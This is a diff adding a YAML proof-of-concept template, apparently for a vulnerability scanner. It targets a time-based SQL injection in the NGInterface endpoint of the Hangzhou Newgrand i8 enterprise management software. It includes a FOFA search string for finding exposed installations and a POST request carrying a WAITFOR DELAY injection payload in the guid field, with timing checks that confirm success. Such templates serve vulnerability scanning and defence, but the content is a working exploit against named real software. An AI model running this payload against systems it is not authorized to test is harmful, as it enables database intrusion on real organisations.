@@ -1,0 +1,24 @@
+id: poc-yaml-newgrand-i8-eems-nginterface-sqli
+info:
+  name: 杭州新中大i8工程企业管理软件 NGInterface SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 新中大i8工程企业管理软件
+  fofa: body="Resource/pic/product_btn.png" || body="/login/SSOValidation.html"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /login/login.html
+  expression: status_code == 200 && contains(title,"NEWGRAND")
+- method: POST
+  path: /filesrv/NGInterface/Index
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: type=getfilelist&guid=';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: status_code == 200 && body == "[]" && contains(content_type,"text/plain")
+    && duration > t2 && duration < t3
+transport: http
